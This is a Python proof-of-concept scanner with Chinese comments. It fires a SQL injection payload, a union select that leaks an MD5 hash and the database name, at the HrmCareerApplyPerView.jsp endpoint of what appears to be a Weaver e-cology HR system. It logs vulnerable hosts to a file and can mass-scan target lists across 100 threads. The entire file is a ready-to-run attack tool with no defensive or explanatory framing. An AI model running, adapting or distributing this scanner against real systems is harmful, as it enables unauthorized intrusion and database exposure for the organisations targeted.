#导包
import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()   #解除警告
def banner():
    banner = ''' 
            ███████╗██╗  ██╗██╗   ██╗ █████╗ ██╗███╗   ██╗██╗   ██╗███████╗
            ██╔════╝██║  ██║██║   ██║██╔══██╗██║████╗  ██║╚██╗ ██╔╝██╔════╝
            ███████╗███████║██║   ██║███████║██║██╔██╗ ██║ ╚████╔╝ ███████╗
            ╚════██║██╔══██║██║   ██║██╔══██║██║██║╚██╗██║  ╚██╔╝  ╚════██║
            ███████║██║  ██║╚██████╔╝██║  ██║██║██║ ╚████║   ██║   ███████║
            ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
                                                               
                                                                    version:1.0.0
'''
    print(banner)
def poc(target):
    url = target+"/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
    headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded",
            "Accept-Encoding":"gzip, deflate",
            "Connection":"close",
            }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5).text
        if '900150983cd24fb0d6963f7d28e17f72' in res:
            print(f"[+] {target} 存在漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} 无")
    except:
        print(f"[*] {target} server error")
def main():
    banner()
    #处理命令行参数
    parser = argparse.ArgumentParser(description='')
    #添加两个参数
    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')
    #调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__':   #主函数入口
    main()     #入口  main()